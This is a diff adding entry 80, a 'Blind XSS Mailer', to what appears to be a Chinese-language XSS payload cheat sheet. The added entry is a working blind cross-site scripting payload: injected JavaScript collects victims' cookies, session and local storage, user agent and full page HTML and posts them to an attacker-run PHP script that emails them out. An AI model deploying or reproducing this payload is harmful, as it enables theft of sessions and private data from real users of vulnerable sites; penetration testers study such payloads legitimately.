@@ -583,6 +583,34 @@ style=display:none></iframe>
 ```
 documentElement.innerHTML='<h1>Not Found</h1>'
 ```
+**80.Blind XSS Mailer (xss邮件盲打)** <br>
+以下payload将其于远程XSS盲打脚本，另存为PHP文件并更改$to和$headers变量 <br>
+因此。需要一台Postfix这样的工作邮件服务器。<br>
+```
+<?php header("Content-type: application/javascript"); ?>
+var mailer = '<?= "//" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"] ?>';
+var msg = 'USER AGENT\n' + navigator.userAgent + '\n\nTARGET URL\n' + document.URL;
+msg += '\n\nREFERRER URL\n' + document.referrer + '\n\nREADABLE COOKIES\n' +
+document.cookie;
+msg += '\n\nSESSION STORAGE\n' + JSON.stringify(sessionStorage) + '\n\nLOCAL
+STORAGE\n' + JSON.stringify(localStorage);
+msg += '\n\nFULL DOCUMENT\n' + document.documentElement.innerHTML;
+var r = new XMLHttpRequest();
+r.open('POST', mailer, true);
+r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+r.send('origin=' + document.location.origin + '&msg=' + encodeURIComponent(msg));
+<?php
+header("Access-Control-Allow-Origin: " . $_POST["origin"]);
+$origin = $_POST["origin"];
+$to = "myName@myDomain";
+$subject = "XSS Blind Report for " . $origin;
+$ip = "Requester: " . $_SERVER["REMOTE_ADDR"] . "\nForwarded For: ".
+$_SERVER["HTTP_X_FORWARDED_FOR"];
+$msg = $subject . "\n\nIP ADDRESS\n" . $ip . "\n\n" . $_POST["msg"];
+$headers = "From: report@myDomain" . "\r\n";
+if ($origin && $msg) mail($to, $subject, $msg, $headers);
+?>
+```
 
 ## 致谢
 **英文议题作者：** <br>
